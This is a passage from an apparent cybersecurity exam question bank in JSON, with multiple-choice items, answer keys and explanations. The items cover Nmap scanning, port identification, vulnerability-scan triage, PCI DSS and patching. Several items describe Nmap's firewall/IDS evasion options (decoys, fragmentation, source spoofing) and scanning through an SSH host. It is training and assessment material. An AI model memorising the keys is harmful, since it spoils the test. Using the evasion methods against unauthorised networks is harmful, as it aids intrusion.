security assessment and is using Nmap to evaluate how a firewall and IDS handle scan traffic. He is reviewing features that Nmap documents under its “firewall/IDS evasion and spoofing” capabilities. Which of the following is <i>not</i> an Nmap firewall/IDS evasion or spoofing capability?","o":["Sending probes with decoy source addresses to make attribution harder","Automatically establishing an IPsec VPN tunnel to encrypt the scan traffic end-to-end","Adding extra data to probes to vary packet length and signatures","Fragmenting IP packets so filtering devices must reassemble traffic before inspection"],"a":1,"e":"Nmap includes several options intended to evade detection or complicate attribution, such as using decoy source addresses so the target sees multiple apparent scanners, appending random or extra data to alter packet sizes and signatures, and fragmenting IP packets so intermediate devices must reassemble traffic before inspection. Automatically creating an IPsec VPN tunnel to encrypt scan traffic end-to-end is not a built-in Nmap evasion or spoofing feature, since Nmap focuses on crafting and sending probe packets rather than negotiating and managing VPN tunnels for encrypted transport.","l":"c5-portscan","l2":"","k":"Nmap detection evasion techniques"},{"id":"d2-40","set":"d2","ch":5,"d":2,"q":"When Casey scanned a network host, she received the results shown here. What does she know based on the scan results?<figure><img alt=\"Screenshot details a scan result with 3 open ports for cisco-s c c p, Apache h t t p d 2.2.3, and i b m-d b 2-admin.\" loading=\"lazy\" src=\"img/pt/c02un006.png\"/></figure>","o":["The device is a Cisco device.","The device is running Linux.","The device was built by IBM.","None of the above."],"a":3,"e":"Casey knows that she saw three open ports and that <code>nmap</code> took its best guess at what was running on those ports. Casey must be very careful about drawing any other conclusions. The question asks what she “knows.”  She can’t determine the operating system for sure because any identification of operating system is a best guess by the tool.  In reality, this is a scan of a Kali Linux system. This is not a Cisco device, it is not running Red Hat Linux, and it was not built by IBM.","l":"c5-portscan","l2":"","k":"Nmap service detection accuracy"},{"id":"d2-41","set":"d2","ch":8,"d":2,"q":"Aidan operates the point-of-sale (POS) network for a company that accepts credit cards and is thus required to be compliant with PCI DSS. During his regular assessment of the POS terminals, he discovers that a recent Windows operating system vulnerability exists on all of them. Since they are all embedded systems that require a manufacturer update, he knows that he cannot install the available patch. What is Aidan’s best option to stay compliant with PCI DSS and protect his vulnerable systems?","o":["Replace the Windows embedded point-of-sale terminals with standard Windows systems.","Build a custom operating system image that includes the patch.","Identify, implement, and document compensating controls.","Remove the POS terminals from the network until the vendor releases a patch."],"a":2,"e":"When a vulnerability exists and a patch has not been released or cannot be installed, compensating controls can provide appropriate protection. In the case of PCI DSS (and other compliance standards), documenting what compensating controls were put in place and making that documentation available are important steps for compliance.","l":"c8-governance","l2":"c6-remediation","k":"compensating security controls"},{"id":"d2-42","set":"d2","ch":5,"d":2,"q":"What occurs when Mia uses the following command to perform an <code>nmap</code> scan of a network?<pre>\n<code>nmap -sP 192.168.2.0/24</code>\n</pre>","o":["A secure port scan of all hosts in the 192.168.0.0 to 192.168.2.255 network range","A scan of all hosts that respond to ping in the 192.168.0.0 to 192.168.255.255 network range","A scan of all hosts that respond to ping in the 192.168.2.1 to 192.168.2.254 network range","A SYN-based port scan of all hosts in the 192.168.2.0 to 192.168.2.255 network range"],"a":2,"e":"The <code>-sP</code> flag for <code>nmap</code> indicates a ping scan, and <code>/24</code> indicates a range of 255 addresses. In this case, that means <code>nmap</code> will scan for hosts that respond to ping in the 192.168.2.1 to 192.168.2.254 IP address range.","l":"c5-recon","l2":"c5-portscan","k":"Nmap ping sweep scan"},{"id":"d2-43","set":"d2","ch":6,"d":2,"q":"Amir’s remote scans of a target organization’s class C network block using the <code>nmap</code> command (<code>nmap -sS 10.0.10.1/24</code>) show only a single web server. If Amir needs to gather additional reconnaissance information about the organization’s network, which of the following scanning techniques is most likely to provide additional detail?","o":["Use a UDP scan.","Perform a scan from on-site.","Scan using the <code>-p 1-65535</code> flag.","Use Nmap’s IPS evasion techniques."],"a":1,"e":"Performing a scan from an on-site network connection is the most likely to provide more detail. Many organizations have a strong external network defense but typically provide fewer protections for on-site network connections to allow internal users to access services. It is possible that the organization uses services found only on less common ports or UDP only services, but both of these options have a lower chance of being true than for an on-site scan to succeed. Nmap does provide firewall and IPS evasion capabilities, but this is also a less likely scenario.","l":"c6-config","l2":"c5-recon","k":"internal vs external scan perspective"},{"id":"d2-44","set":"d2","ch":5,"d":2,"q":"Damian wants to limit the ability of attackers to conduct passive fingerprinting exercises on his network. Which of the following practices will help to mitigate this risk?","o":["Implement an IPS.","Implement a firewall.","Disable promiscuous mode for NICs.","Enable promiscuous mode for NICs."],"a":2,"e":"Passive fingerprinting relies on the ability of a system to capture traffic to analyze. Preventing systems from using promiscuous mode will provide attackers with very little data when performing passive fingerprinting. Both intrusion prevention systems and firewalls can help with active fingerprinting but will do nothing to stop passive fingerprinting.","l":"c5-recon","l2":"c1-network","k":"passive traffic analysis prevention"},{"id":"d2-45","set":"d2","ch":5,"d":2,"q":"As part of his active reconnaissance activities, Frank is provided with a shell account accessible via SSH. If Frank wants to run a default <code>nmap</code> scan on the network behind the firewall shown here, how can he accomplish this?<figure><img alt=\"Network diagram details an external host connecting through a firewall to a shell host 192.168.34.11 within an internal protected network.\" loading=\"lazy\" src=\"img/pt/c02un007.png\"/></figure>","o":["<code>ssh -t 192.168.34.11 nmap 192.168.34.0/24</code>","<code>ssh -R 8080:192.168.34.11:8080 [remote account: remote password]</code>","<code>ssh -proxy 192.168.11 [remote account:remote password]</code>","Frank cannot scan multiple systems with a single <code>ssh</code> command."],"a":0,"e":"Running <code>ssh -t 192.168.34.11 nmap 192.168.34.0/24</code> logs in to the remote system over SSH and immediately executes <code>nmap</code> on that host, which is already inside the protected 192.168.34.0/24 network, so the scan runs from behind the firewall and performs <code>nmap</code>’s default host and port discovery against all systems in that subnet. The command that uses <code>-R 8080:192.168.34.11:8080</code> only sets up a remote port forwarding tunnel on port 8080 and never invokes <code>nmap</code>, so it does not perform a scan of the internal network. The command that uses <code>-proxy 192.168.11</code> is not valid SSH syntax and also omits any <code>nmap</code> command, so it cannot achieve the desired active reconnaissance. The statement that it is impossible to scan multiple systems with a single SSH command is wrong because SSH can be used to run a single remote command that itself targets many hosts, such as an <code>nmap</code> scan over an entire subnet.","l":"c5-recon","l2":"c5-portscan","k":"remote SSH network scanning"},{"id":"d2-46","set":"d2","ch":7,"d":2,"q":"Angela captured the following packets during a reconnaissance effort run by her organization’s red team. What type of information are they looking for?<figure><img alt=\"Screenshot details 16 rows of H T T P logs with I P addresses, time in seconds, and directory traversal attempts for system files.\" loading=\"lazy\" src=\"img/pt/c02un008.png\"/></figure>","o":["Vulnerable web applications","SQL injection","Directory traversal attacks","Passwords"],"a":2,"e":"Angela has captured part of a Nikto scan that targets a vulnerable ASP script that allows directory traversal attacks. If it was successful, the contents of files like <code>/etc/passwd</code> would be accessible using the web server.","l":"c7-web-ot","l2":"c6-tools","k":"directory traversal scan detection"},{"id":"d2-47","set":"d2","ch":5,"d":2,"q":"Stacey encountered a system that shows as “filtered” and “firewalled” during an <code>nmap</code> scan. Which of the following techniques should she not consider as she is planning her next scan?","o":["Packet fragmentation","Spoofing the source address","Using decoy scans","Spoofing the destination address"],"a":3,"e":"<code>nmap</code> has a number of built-in anti-firewall capabilities, including packet fragmentation, decoy scans, spoofing of the source IP address and source port, and scan timing techniques that make detection less likely. Spoofing the target IP address won’t help; Stacey’s packets still need to get to the actual target.","l":"c5-portscan","l2":"","k":"Nmap firewall evasion"},{"id":"d2-48","set":"d2","ch":6,"d":2,"q":"Kim is preparing to deploy a new vulnerability scanner and wants to ensure that she can get the most accurate view of configuration issues on laptops belonging to traveling salespeople. Which technology will work best in this situation?","o":["Agent-based scanning","Server-based scanning","Passive network monitoring","Noncredentialed scanning"],"a":0,"e":"Using an agent-based scanning approach will provide Kim with the most reliable results for systems that are not always connected to the network. The agent can run the scans and then report results the next time the agent is connected to a network. The other technologies all require that the system be connected to the network during the scan.","l":"c6-config","l2":"","k":"agent-based vulnerability scanning"},{"id":"d2-49","set":"d2","ch":7,"d":2,"q":"Carla runs a vulnerability scan of a new appliance that engineers are planning to place on her organization’s network and finds the results shown here. Of the actions listed, which would correct the highest criticality vulnerability?<figure><img alt=\"Screenshot details 15 vulnerabilities for a Free B S D based device with severity levels, port numbers, active, and fixed status.\" loading=\"lazy\" src=\"img/pt/c02un009.png\"/></figure>","o":["Block the use of TLS v1.0.","Replace the expired SSL certificate.","Remove the load balancer.","Correct the information leakage vulnerability."],"a":1,"e":"As Carla reads this report, she should note that the bottom three vulnerabilities have a status of Fixed. This indicates that the information leakage vulnerability is already corrected and that the server no longer supports TLS v1.0. The alert about the load balancer is severity 1, and Carla should treat it as informational. This leaves a severity 2 vulnerability for the expired SSL certificate as the highest-severity issue of the choices presented.","l":"c7-server-network","l2":"c2-crypto","k":"expired SSL certificate remediation"},{"id":"d2-50","set":"d2","ch":7,"d":2,"q":"Sadiq is responsible for the security of a network used to control systems within his organization’s manufacturing plant. The network connects manufacturing equipment, sensors, and controllers. He runs a vulnerability scan on this network and discovers that several of the controllers are running out-of-date firmware that introduces security issues. The manufacturer of the controllers is out of business. What action can Sadiq take to best remediate this vulnerability in an efficient manner?","o":["Develop a firmware update internally and apply it to the controllers.","Post on an Internet message board seeking other organizations that have developed a patch.","Ensure that the industrial control system (ICS) is on an isolated network.","Use an intrusion prevention system on the ICS network."],"a":2,"e":"Sadiq should ensure that the industrial control system (ICS) is on an isolated network, unreachable from any Internet-connected system. This greatly reduces the risk of exploitation. It would not be cost-effective to develop a patch himself, and Sadiq should not trust any software that he obtains from an Internet forum. An intrusion prevention system, while a good idea, is not as strong a control as network isolation.","l":"c7-web-ot","l2":"c1-network","k":"ICS network isolation"},{"id":"d2-51","set":"d2","ch":7,"d":2,"q":"Vic scanned a Windows server used in his organization and found the result shown here. The server is on an internal network with access limited to IT staff and is not part of a domain. How urgently should Vic remediate this vulnerability?<figure><img alt=\"Screenshot lists security report for administrator account password not expiring with Q I D 90980 and C V S S score 6.3 for Windows.\" loading=\"lazy\" src=\"img/pt/c02un010.png\"/></figure>","o":["Vic should drop everything and remediate this vulnerability immediately.","While Vic does not need to drop everything, this vulnerability requires urgent attention and should be addressed quickly.","This is a moderate vulnerability that can be scheduled for remediation at a convenient time.","This vulnerability is informational in nature and may be left in place."],"a":2,"e":"This vulnerability has a CVSS rating of 6.3 and is further mitigated by the fact that the server is on an internal network, accessible only to trusted staff. This rises above the level of an informational report and should be addressed, but it does not require urgent attention.","l":"c7-cvss","l2":"c7-validate","k":"CVSS severity contextual rating"},{"id":"d2-52","set":"d2","ch":12,"d":2,"q":"Rob’s manager recently asked him for an overview of any critical security issues that exist on his network. He looks at the reporting console of his vulnerability scanner and sees the options shown here. Which of the following report types would be his best likely starting point?<figure><img alt=\"Screenshot details 8 reports with columns for title, type, and vulnerability data of scan based and host based data.\" loading=\"lazy\" src=\"img/pt/c02un011.png\"/></figure>","o":["Technical Report","High-Severity Report","Qualys Patch Report","Unknown Device Report"],"a":1,"e":"The High-Severity Report is the most likely report of the choices given that will summarize critical security issues. The Technical Report will likely contain too much detail for Rob’s manager. The Patch Report will indicate systems and applications that are missing patches but omit other security issues. The Unknown Device Report will focus on systems detected during the scan that are not registered with the organization’s asset management system.","l":"c12-vuln-report","l2":"c6-remediation","k":"high-severity vulnerability reporting"},{"id":"d2-53","set":"d2","ch":6,"d":2,"q":"Wendy is the security administrator for a membership association that is planning to launch an online store. As part of this launch, she will become responsible for ensuring that the website and associated systems are compliant with all relevant standards. What regulatory regime specifically covers credit card information?","o":["PCI DSS","FERPA","HIPAA","SOX"],"a":0,"e":"The Payment Card Industry Data Security Standard (PCI DSS) regulates credit and debit card information. The Family Educational Rights and Privacy Act (FERPA) applies to student educational records. The Health Insurance Portability and Accountability Act (HIPAA) regulates protected health information. The Sarbanes–Oxley (SOX) Act requires controls for the handling of financial records for public companies.","l":"c6-requirements","l2":"","k":"PCI DSS compliance requirements"},{"id":"d2-54","set":"d2","ch":5,"d":2,"q":"During a port scan of a server, Miguel discovered that the following ports are open on the internal network:<ul class=\"square\">\n<li>TCP port 25</li>\n<li>TCP port 80</li>\n<li>TCP port 110</li>\n<li>TCP port 443</li>\n<li>TCP port 1433</li>\n<li id=\"Que54\">TCP port 3389</li></ul>\n<p>The scan results provide evidence that a variety of services are running on this server. Which one of the following services is <i>not</i> indicated by the scan results?</p>","o":["Web","Database","SSH","RDP"],"a":2,"e":"Web servers commonly run on ports 80 (for HTTP) and 443 (for HTTPS). Port 110 is the default, unencrypted TCP port for the Post Office Protocol version 3 (POP3), used by email clients to download messages from a mail server. Database servers commonly run on ports 1433 (for Microsoft SQL Server), 1521 (for Oracle), or 3306 (for MySQL). Remote Desktop Protocol services commonly run on port 3389. There is no evidence that SSH, which uses port 22, is running on this server.","l":"c5-portscan","l2":"","k":"web and mail port identification"},{"id":"d2-55","set":"d2","ch":6,"d":2,"q":"Nina is a software developer, and she receives a report from her company’s cybersecurity team that a vulnerability scan detected a SQL injection vulnerability in one of her applications. She examines her code and makes a modification in a test environment that she believes corrects the issue. What should she do next?","o":["Deploy the code to production immediately to resolve the vulnerability.","Request a scan of the test environment to confirm that the issue is corrected.","Mark the vulnerability as resolved and close the ticket.","Hire a consultant to perform a penetration test to confirm that the vulnerability is resolved."],"a":1,"e":"Nina should perform testing of her code before deploying it to production. Because this code was designed to correct an issue in a vulnerability scan, Nina should ask the security team to rerun the scan to confirm that the vulnerability scan was resolved as one component of her testing. A penetration test is overkill and not necessary in this situation. Nina should not deploy the code to production until it is tested. She should not mark the issue as resolved until it is verified to work in production.","l":"c6-remediation","l2":"c8-appsec","k":"test environment scan validation"},{"id":"d2-56","set":"d2","ch":7,"d":2,"q":"George recently ran a port scan on a network device used by his organization. Which one of the following open ports represents the most significant possible security vulnerability?\n<p><a href=\"#Que57\">Questions 57</a>–<a href=\"#Que59\">59</a> refer to the following scenario:</p>\n<p>Harold runs a vulnerability scan of a server that he is planning to move into production and finds the vulnerability shown here.</p>\n<figure><img alt=\"Screenshot details vulnerability report for S S L T L S server version 1.0 on port 3389 with Q I D 38628 and C V S S base score 2.6.\" loading=\"lazy\" src=\"img/pt/c02un012.png\"/></figure>","o":["22","23","161","443"],"a":1,"e":"Port 23 is used by telnet, an insecure unencrypted communications protocol. George should ensure that telnet is disabled and blocked. Secure Shell (SSH) runs on port 22 and serves as a secure alternative. Port 161 is used by the Simple Network Management Protocol (SNMP), and port 443 (HTTPS) is used for secure web connections.","l":"c7-server-network","l2":"c5-portscan","k":"insecure telnet port"},{"id":"d2-57","set":"d2","ch":5,"d":2,"q":"What operating system is most likely running on the server in this vulnerability scan report?","o":["macOS","Windows","Kali","RHEL"],"a":1,"e":"This system is exposing a service on port 3389. This port is typically used for remote administrative access to Windows servers.","l":"c5-portscan","l2":"c7-server-network","k":"RDP operating system identification"},{"id":"d2-58","set":"d2","ch":5,"d":2,"q":"Harold is preparing to correct the vulnerability. What service should he inspect to identify the issue?","o":["SSH","HTTPS","RDP","SFTP"],"a":2,"e":"The issue identified in this scan report is with a service running on port 3389. Windows systems use port 3389 for the Remote Desktop Protocol (RDP). Therefore, Harold should turn to this service first.","l":"c5-portscan","l2":"c7-server-network","k":"Remote Desktop Protocol service"},{"id":"d2-59","set":"d2","ch":7,"d":2,"q":"Harold would like to secure the service affected by this vulnerability. Which one of the following protocols/versions would be an acceptable way to resolve the issue?","o":["SSL v2.0","SSL v3.0","TLS v1.0","None of the above"],"a":3,"e":"None of the protocols and versions listed in this question is an acceptable way to correct this vulnerability. All versions of SSL contain critical vulnerabilities and should no longer be used. TLS v1.0 also contains a vulnerability that would allow an attacker to downgrade the cryptography used by the server. Harold should upgrade the server to support TLS v1.3.","l":"c7-server-network","l2":"c2-crypto","k":"secure remote administration protocols"},{"id":"d2-60","set":"d2","ch":2,"d":2,"q":"Seth found the vulnerability shown here in one of the systems on his network. What component requires a patch to correct this issue?<figure><img alt=\"Screenshot details V M ware E S X i report from April 5, 2020, with a C V S S score of 6.6 and details for patch K B 2149576.\" loading=\"lazy\" src=\"img/pt/c02un013.png\"/></figure>","o":["Operating system","VPN concentrator","Network router or switch","Hypervisor"],"a":3,"e":"VMware is a virtualization platform that is widely used to run multiple guest operating systems on the same hardware platform. This vulnerability indicates a vulnerability in VMware itself, which is the hypervisor that moderates access to physical resources by those guest operating systems.","l":"c2-infra","l2":"c7-server-network","k":"VMware hypervisor virtualization"},{"id":"d2-61","set":"d2","ch":7,"d":2,"q":"Quentin ran a vulnerability scan of a server in his organization and discovered the results shown here. Which one of the following actions is <i>not</i> required to resolve one of the vulnerabilities on this server?<figure><img alt=\"Screenshot details 15 vulnerabilities with severity indicators and descriptions for T L S ciphers, Apache Tomcat, and S S L certificates.\" loading=\"lazy\" src=\"img/pt/c02un014.png\"/></figure>","o":["Reconfigure cipher support.","Apply Windows security patches.","Obtain a new SSL certificate.","Enhance account security policies."],"a":1,"e":"Quentin should reconfigure cipher support to resolve the issues surrounding the weak cipher support of SSL/TLS and RDP. He should also obtain a new SSL certificate to resolve multiple issues with the current certificate. He should add account security requirements to resolve the naming of guest accounts and the expiration of administrator passwords. There is no indication that any Windows patches are missing from this system.","l":"c7-server-network","l2":"c2-crypto","k":"SSL cipher suite reconfiguration"},{"id":"d2-62","set":"d2","ch":6,"d":2,"q":"The presence of <span class=\"wol\"></span> triggers specific vulnerability scanning requirements based on law or regulation.\n<p><a href=\"#Que63\">Questions 63</a>–<a href=\"#Que65\">65</a> refer to the following scenario:</p>\n<p>Stella is analyzing the results of a vulnerability scan and comes across the vulnerability shown here on a server in her organization. The SharePoint service in question processes all of the organization’s work orders and is a critical part of the routine business workflow.</p>\n<figure><img alt=\"Screenshot of Technical reports details a summary of vulnerabilities for Microsoft SharePoint, including threat and impact, and patch links.\" loading=\"lazy\" src=\"img/pt/c02un015.png\"/></figure>","o":["Credit card information","Protected health information","Personally identifiable information","Trade secret information"],"a":0,"e":"Although all of these categories of information should trigger vulnerability scanning for assets involved in their storage, processing, or transmission, only credit card information has specific regulations covering these scans. The Payment Card Industry Data Security Standard (PCI DSS) contains detailed requirements for vulnerability scanning.","l":"c6-requirements","l2":"","k":"PCI DSS data scope"},{"id":"d2-63","set":"d2","ch":7,"d":2,"q":"What priority should Stella place on remediating this vulnerability?","o":["Stella should make this vulnerability one of her highest priorities.","Stella should remediate this vulnerability within the next several weeks.","Stella should remediate this vulnerability within the next several months.","Stella does not need to assign any priority to remediating this vulnerability."],"a":0,"e":"Stella should remediate this vulnerability as quickly as possible because it is rated by the vendor as a Critical vulnerability. The description of the vulnerability indicates that an attacker could execute arbitrary code on the server and use this vulnerability to achieve escalation of privilege. Therefore, this should be one of Stella’s highest priorities for remediation.","l":"c7-validate","l2":"c6-remediation","k":"vendor critical patch prioritization"},{"id":"d2-64","set":"d2","ch":5,"d":2,"q":"What operating system is most likely running on the server in this vulnerability scan report?","o":["macOS","Windows","Kali","RHEL"],"a":1,"e":"This system is running SharePoint. This application runs only on Microsoft Windows servers.","l":"c5-portscan","l2":"c7-server-network","k":"SharePoint operating system dependency"},{"id":"d2-65","set":"d2","ch":7,"d":2,"q":"What is the best way that Stella can correct this vulnerability?","o":["Deploy an intrusion prevention system.","Apply one or more application patches.","Apply one or more operating system patches.","Disable the service."],"a":1,"e":"The vulnerability report indicates that SharePoint application patches are available to correct the vulnerability on a variety of versions of SharePoint. This should be Stella’s first course of action since it will correct the underlying issue. Deploying an intrusion prevention system may also prevent attackers from exploiting the vulnerability, but it will depend on the positioning of the IPS and the attacker’s location on the network and will not correct the underlying issue. There is no indication that an operating system patch will correct the issue. Disabling the service will prevent an attacker from exploiting the vulnerability but will also disable the business-critical service.","l":"c7-server-network","l2":"c6-remediation","k":"application security patch installation"},{"id":"d2-66","set":"d2","ch":7,"d":2,"q":"Harry is developing a vulnerability scanning program for a large network of sensors used by his organization to monitor a transcontinental gas pipeline. What term is commonly used to describe this type of sensor network?","o":["WLAN","VPN","P2P","SCADA"],"a":3,"e":"A supervisory control and data acquisition (SCADA) network is a form of industrial control system (ICS) that is used to maintain sensors and control systems over a large geographic area.","l":"c7-web-ot","l2":"c2-infra","k":"SCADA industrial control systems"},{"id":"d2-67","set":"d2","ch":6,"d":2,"q":"This morning, Eric ran a vulnerability scan in an attempt to detect a vulnerability that was announced by a software manufacturer yesterday afternoon. The scanner did not detect the vulnerability although Eric knows that at least two of his servers should have the issue. Eric contacted the vulnerability scanning vendor, who assured him that they released a signature for the vulnerability overnight. What should Eric do as a next step?","o":["Check the affected servers to verify a false positive.","Check the affected servers to verify a false negative.","Report a bug to the vendor.","Update the vulnerability signatures."],"a":3,"e":"The most likely issue is that Eric’s scanner has not pulled the most recent signatures from the vendor’s vulnerability feed. Eric should perform a manual update and rerun the scan before performing an investigation of the servers in question or filing a bug report.","l":"c6-config","l2":"","k":"scanner signature feed update"},{"id":"d2-68","set":"d2","ch":7,"d":2,"q":"Natalie ran a vulnerability scan of a web application recently deployed by her organization, and the scan result reported a blind SQL injection. She reported the vulnerability to the developers, who scoured the application and made a few modifications but did not see any evidence that this attack was possible. Natalie reran the scan and received the same result. The developers are now insisting that their code is secure. What is the most likely scenario?","o":["The result is a false positive.","The code is deficient and requires correction.","The vulnerability is in a different web application running on the same server.","Natalie is misreading the scan report."],"a":0,"e":"Blind SQL injection vulnerabilities are difficult to detect and are a notorious source of false positive reports. Natalie should verify the results of the tests performed by the developers but should be open to the possibility that this is a false positive report, since that is the most likely scenario.","l":"c7-validate","l2":"c7-web-ot","k":"blind SQL injection false positives"},{"id":"d2-69","set":"d2","ch":7,"d":2,"q":"Kasun discovers a missing Windows security patch during a vulnerability scan of a server in his organization’s datacenter. Upon further investigation, he discovers that the system is virtualized. Where should he apply the patch?","o":["To the virtualized system.","The patch is not necessary.","To the domain controller.","To the virtualization platform."],"a":0,"e":"Virtualized systems run full versions of operating systems. If Kasun’s scan revealed a missing operating system patch when he scanned a virtualized server, the patch should be applied directly to that guest operating system.","l":"c7-server-network","l2":"c2-infra","k":"virtual machine OS patching"},{"id":"d2-70","set":"d2","ch":6,"d":2,"q":"Joaquin is frustrated at the high level of false positive reports produced by his vulnerability scans and is contemplating a series of actions designed to reduce the false positive rate. Which one of the following actions is <i>least</i> likely to have the desired effect?","o":["Moving to credentialed scanning","Moving to agent-based scanning","Integrating asset information into the scan","Increasing the sensitivity of scans"],"a":3,"e":"Joaquin can improve the quality and quantity of information available to the scanner by moving to credentialed scanning, moving to agent-based scanning, and integrating asset information into the scans. Any of these actions is likely to reduce the false positive rate. Increasing the sensitivity of scans would likely have the opposite effect, causing the scanner to report even more false positives.","l":"c6-config","l2":"c7-validate","k":"credentialed scanning accuracy"},{"id":"d2-71","set":"d2","ch":6,"d":2,"q":"Joe is conducting a network vulnerability scan against his datacenter and receives reports from system administrators that the scans are slowing down their systems. There are no network connectivity issues, only performance problems on individual hosts. He looks at the scan settings shown here. Which setting would be most likely to correct the problem?<figure><img alt=\"Screenshot details the Advanced Settings menu with checkboxes and performance fields, including 5 seconds network timeout.\" loading=\"lazy\" src=\"img/pt/c02un016.png\"/></figure>","o":["Scan IP addresses in a random order","Network timeout (in seconds)","Max simultaneous checks per host","Max simultaneous hosts per scan"],"a":2,"e":"Of the choices presented, the maximum number of simultaneous checks per host is the only setting that would affect individual systems. Changing the number of simultaneous hosts per scan and the network timeout would have an effect on the broader network. Randomizing IP addresses would not have a performance impact.","l":"c6-config","l2":"c6-remediation","k":"scanner performance optimization"},{"id":"d2-72","set":"d2","ch":7,"d":2,"q":"Isidora runs a vulnerability scan of the management interface for her organization’s DNS service. She receives the vulnerability report shown here. What should be Isidora’s next action?<figure><img alt=\"Screenshot details a P C I vulnerability report for a cookie missing a secure attribute with Q I D 150122 and 2 detections from August 2020.\" loading=\"lazy\" src=\"img/pt/c02un017.png\"/></figure>","o":["Disable the use of cookies on this service.","Request that the vendor rewrite the interface to avoid this vulnerability.","Investigate the contents of the cookie.","Shut down the DNS service."],"a":2,"e":"This report simply states that a cookie used by the service is not encrypted. Before raising any alarms, Isidora should investigate the contents of the cookie to determine whether the compromise of its contents would introduce a security issue. This might be the case if the cookie contains session or authentication information. However, if the cookie does not contain any sensitive contents, Isidora may be able to simply leave the service as is.","l":"c7-web-ot","l2":"c7-validate","k":"unencrypted session cookie analysis"},{"id":"d2-73","set":"d2","ch":6,"d":2,"q":"Zara is prioritizing vulnerability scans and would like to base the frequency of scanning on the information asset value. Which of the following criteria would be most appropriate for her to use in this analysis?","o":["Cost of hardware acquisition","Cost of hardware replacement","Types of information processed","Depreciated hardware cost"],"a":2,"e":"Information asset value refers to the value that the organization places on data stored, processed, or transmitted by an asset. In this case, the types of information processed (e.g., regulated data, intellectual property, personally identifiable information) helps to determine information asset value. The cost of server acquisition, cost of hardware replacement, and depreciated cost all refer to the financial value of the hardware, which is a different concept than information asset value.","l":"c6-requirements","l2":"c7-validate","k":"information asset value prioritization"},{"id":"d2-74","set":"d2","ch":6,"d":2,"q":"Laura is working to upgrade her organization’s vulnerability management program. She would like to add technology that is capable of retrieving the configurations of systems, even when they are highly secured. Many systems use local authentication, and she wants to avoid the burden of maintaining accounts on all of those systems. What technology should Laura consider to meet her requirement?","o":["Credentialed scanning","non-credentialed scanning","Server-based scanning","Agent-based scanning"],"a":3,"e":"Laura should consider deploying vulnerability scanning agents on the systems she wants to scan. These agents can retrieve configuration information and send it to the scanner for analysis. Credentialed scanning would also be able to retrieve this information, but it would require that Laura manage accounts on each scanned system. Server-based scanning would not be capable of retrieving configuration information from the host unless run in credentialed mode. Non-credentialed scans would not have the access required to retrieve detailed configuration information from scan targets.","l":"c6-config","l2":"","k":"agent-based vulnerability assessment"},{"id":"d2-75","set":"d2","ch":7,"d":2,"q":"Javier discovered the vulnerability shown here in a system on his network. He is unsure what system component is affected. What type of service is causing this vulnerability?<figure><img alt=\"Screenshot details security report for Microsoft S Q L Server Compact 3.5 with a C V S S score of 9.3 and 20 detections.\" loading=\"lazy\" src=\"img/pt/c02un018.png\"/></figure>","o":["Backup service","Database service","File sharing","Web service"],"a":1,"e":"The vulnerability report states that the issue is with SQL Server. SQL Server is a database platform provided by Microsoft.","l":"c7-server-network","l2":"c5-portscan","k":"database service identification"},{"id":"d2-76","set":"d2","ch":7,"d":2,"q":"Alicia runs a vulnerability scan of a server being prepared for production and finds the vulnerability shown here. Which one of the following actions is <i>least</i> likely to reduce this risk?<figure><img alt=\"Screenshot details severity 4 Open S S H vulnerability C V E 2013-4548 with threat, impact, solution, compliance, malware, and results.\" loading=\"lazy\" src=\"img/pt/c02un019.png\"/></figure>","o":["Block all connections on port 22.","Upgrade OpenSSH.","Disable AES-GCM in the server configuration.","Install a network IPS in front of the server."],"a":3,"e":"It is unlikely that a network IPS would resolve this issue because it would not be able to view the contents of an encrypted SSH session. Disabling port 22 would correct the issue although it may cause business disruption. Disabling AES-GCM is listed in the solution section as a feasible workaround, whereas upgrading OpenSSH is the ideal solution.","l":"c7-server-network","l2":"c8-controls","k":"encrypted traffic IPS limitation"},{"id":"d2-77","set":"d2","ch":7,"d":2,"q":"After scanning his organization’s email server, Singh discovered the vulnerability shown here. What is the most effective response that Singh can take in this situation?<figure><img alt=\"Screenshot details Microsoft Exchange Server vulnerability report with Medium severity, I D 77026, C V S S score 5, and risk details.\" loading=\"lazy\" src=\"img/pt/c02un020.png\"/></figure>","o":["Upgrade to the most recent version of Microsoft Exchange.","Upgrade to the most recent version of Microsoft Windows.","Implement the use of strong encryption.","No action is required."],"a":3,"e":"Unfortunately, Singh cannot take any action to remediate this vulnerability. He could consider restricting network access to the server, but this would likely have an undesirable effect on email access. The use of encryption would not correct this issue. The vulnerability report indicates that “There is no known fix at this time,” meaning that upgrading Windows or Exchange would not correct the problem.","l":"c7-validate","l2":"c6-remediation","k":"informational vulnerability findings"},{"id":"d2-78","set":"d2","ch":7,"d":2,"q":"A SQL injection exploit typically gains access to a database by exploiting a vulnerability in a(n)<span class=\"wol\"></span>.\n<p><a href=\"#Que79\">Questions 79</a>–<a href=\"#Que81\">81</a> refer to the following scenario:</p>\n<p>Ryan ran a vulnerability scan of one of his organization’s production systems and received the report shown here. He would like to understand this vulnerability better and then remediate the issue.</p>\n<figure><img alt=\"Screenshot details Microsoft I I S Server vulnerability C V E 2017 0055 with C V S S score 4.3 and C V S S 3 score 6.1.\" loading=\"lazy\" src=\"img/pt/c02un021.png\"/></figure>","o":["Operating system","Web application","Database server","Firewall"],"a":1,"e":"SQL injection vulnerabilities target the data stored in enterprise databases, but they do so by exploiting flaws in client-facing applications. These flaws are most commonly, but not exclusively, found in web applications.","l":"c7-web-ot","l2":"","k":"SQL injection target vector"},{"id":"d2-79","set":"d2","ch":7,"d":2,"q":"Ryan will not be able to correct the vulnerability for several days. In the meantime, he would like to configure his intrusion prevention system to watch for issues related to this vulnerability. Which one of the following protocols would an attacker use to exploit this vulnerability?","o":["SSH","HTTPS","FTP","RDP"],"a":1,"e":"This vulnerability exists in Microsoft Internet Information Services (IIS), which is a web server. The fact that the vulnerability could result in cross-site scripting issues also points to a web server. Web servers use the HTTP and HTTPS protocols. Ryan could configure IPS rules to filter HTTP/HTTPS access to this server.","l":"c7-server-network","l2":"c8-controls","k":"temporary service port restriction"},{"id":"d2-80","set":"d2","ch":7,"d":2,"q":"Which one of the following actions could Ryan take to remediate the underlying issue without disrupting business activity?","o":["Disable the IIS service.","Apply a security patch.","Modify the web application.","Apply IPS rules."],"a":1,"e":"Applying a security patch would correct the issue on this server. The fact that the header for this vulnerability includes a Microsoft security bulletin ID indicates that Microsoft likely released a patch for the vulnerability. Disabling the IIS service would disrupt business activity on the server. Modifying the web application would not likely address this issue as the report indicates that it is an issue with the underlying IIS server and not a specific web application. IPS rules may prevent an attacker from exploiting the vulnerability, but they would not correct the underlying issue.","l":"c7-server-network","l2":"c6-remediation","k":"vulnerability security patch 